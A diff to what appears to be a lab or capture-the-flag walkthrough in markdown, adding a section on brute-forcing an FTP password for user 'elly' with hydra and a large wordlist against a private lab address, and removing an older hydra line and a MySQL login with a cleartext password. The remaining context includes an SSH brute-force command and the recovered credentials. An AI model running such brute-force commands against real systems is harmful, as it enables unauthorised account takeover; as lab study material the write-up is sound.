@@ -209,6 +209,18 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 
 
 
+## brute force elly ftp passowrd
+
+
+
+```
+hydra -l elly -P /home/kali/Downloads/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt ftp://192.168.92.149 
+```
+
+```
+elly : ylle
+```
+
 
 ---
 
@@ -413,18 +425,6 @@ mysql -u root -p plbkac -h 192.168.92.149 --skip-ssl
 
 
 
-
-
-
-```
-hydra -l elly -P /usr/share/wordlists/rockyou.txt ftp://192.168.92.149 
-```
-
-```
-elly : ylle
-```
-
-
 ```
 hydra -L users -e nsr ssh://192.168.15.151
 ```
@@ -433,12 +433,6 @@ hydra -L users -e nsr ssh://192.168.15.151
 SHayslett : SHayslett
 ```
 
-
-
-
-```
-mysql -u root -pplbkac -h 192.168.92.149 --skip-ssl
-```
 
 
 
